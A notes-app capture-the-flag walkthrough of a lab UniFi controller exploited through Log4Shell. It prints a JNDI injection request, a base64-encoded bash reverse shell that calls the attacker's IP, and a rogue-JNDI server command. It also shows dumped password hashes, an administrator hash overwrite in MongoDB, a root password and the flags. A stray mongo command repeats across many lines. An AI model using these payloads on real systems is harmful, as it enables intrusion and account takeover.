public:: true
tags:: log4j, log4shell, CVE-2021-44228, JNDI

- The target machine exposes an instance of the unifi-controller vulnerable to `CVE-2021-44228` (AKA Log4Shell).
  This vulnerability can be exploited both manually or via metasploit. I did it manually because I only found the metasploit module later.
- The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability whereby a JNDI string can be sent to the server via the `remember` field of a POST request to the `/api/login` endpoint.
- I followed [this guide](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) to exploit the vuln
	- First lets test if the payload is triggered
	  logseq.order-list-type:: number
		- From the attacker side we monitor incoming traffic on port `389/tcp`
		  logseq.order-list-type:: number
		  ```bash
		  sudo tcpdump -i tun0 dst port 389
		  ```
		- Then send the payload to the target application
		  logseq.order-list-type:: number
		  ```bash
		  curl -i -s -k -X POST \
		  	-H 'Host: 10.129.96.149:8443' \
		      -H 'Content-Length: 95' \
		      --data-binary '{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.14.147/o=tomcat}\",\"strict\":true}' \
		      'https://10.129.96.149:8443/api/login'
		  ```
		- If everything went right we should see incoming packets in `tcpdump` coming from the target machine
		  logseq.order-list-type:: number
	- We now need to setup a rouge JNDI server to serve a malicious Java object.
	  logseq.order-list-type:: number
	  For this purpose I opted for [this fork](https://github.com/goncalor/rogue-jndi) of [rogue-jndi](https://github.com/veracode-research/rogue-jndi) beacuse it already contains a `Dockerfile`.
		- Prepare the payload
		  logseq.order-list-type:: number
		  ```bash
		  ┌──(crazybyte㉿kali)-[~]
		  └─$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.147/4444 0>&1' | base64
		  YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzQ0NDQgMD4mMQo=
		  ```
		- Start the rouge-jndi server
		  logseq.order-list-type:: number
		  ```bash
		  podman container run --rm -ti -p 389:1389 rogue-jndi:local \
		  	-c "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzQ0NDQgMD4mMQo}|{base64,-d}|{bash,-i}" \
		      -n 10.10.14.147
		  ```
	- **User flag** at `/home/michael/user.txt`
	  logseq.order-list-type:: number
		- 6ced1a6a89e666c0620cdb10262ba127
		  logseq.order-list-type:: number
		  background-color:: green
- ### Privesc
	- Search for user passwords in the application database
	  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
	  ```bash
	  > mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
	  "email" : "administrator@unified.htb",
	  administrator:$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
	  "email" : "michael@unified.htb",
	  michael:$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
	  "email" : "seamus@unified.htb",
	  Seamus:$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.
	  "email" : "warren@unified.htb",
	  warren:$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.
	  "email" : "james@unfiied.htb",
	  james:$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1
	  ```
	  *Reported only relevant data*
		- I tried to decrypt them via `john` without any luck
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
	- Lets update the password for the user **administrator** to a known one
	  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		- Database data
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		  ```json
		  # administrator record
		  "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
		  "name" : "administrator",
		  "email" : "administrator@unified.htb",
		  "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
		  "time_created" : NumberLong(1640900495),
		  "last_site_name" : "default",
		  "ui_settings" : {
		    [...]
		  ```
		- Generate a new dedicated password
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		  ```bash
		  ┌──(crazybyte㉿kali)-[~/HTB/StartingPoint/Tier2/Unified]
		  └─$ mkpasswd -m sha-512 password
		  $6$QZMDmveKFddQDsKb$JqIc/LSEt04H3KhcIh.04r3ibToQLTRTFmgBqea9IQKw94V.XtJKQF8EzQo8SaG0lJrN2w1fSJO61vr5N3JaD/
		  ```
		- Update password in mongodb
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		  ```bash
		  mongo --port 27117 ace --eval 'db.admin.update( { "name" : "administrator" }, { $set : { "x_shadow" : "$6$QZMDmveKFddQDsKb$JqIc/LSEt04H3KhcIh.04r3ibToQLTRTFmgBqea9IQKw94V.XtJKQF8EzQo8SaG0lJrN2w1fSJO61vr5N3JaD/" } } )'
		  ```
	- Now we can login as **administrator** in the Unifi Controller webUI
	  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		- From there we can head to `Settings -> Site -> Device Authentication -> SSH Authentication` and read the plain-text password used to allow the application to access the root user via SSH
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		  #+BEGIN_CAUTION
		  username: root
		  password: NotACrackablePassword4U2022
		  #+END_CAUTION
	- **Root flag** at `/root/root.txt`
	  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		- e50bc93c75b634e4b272d2f771c33681
		  logseq.order-list-type:: number# mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
		  background-color:: green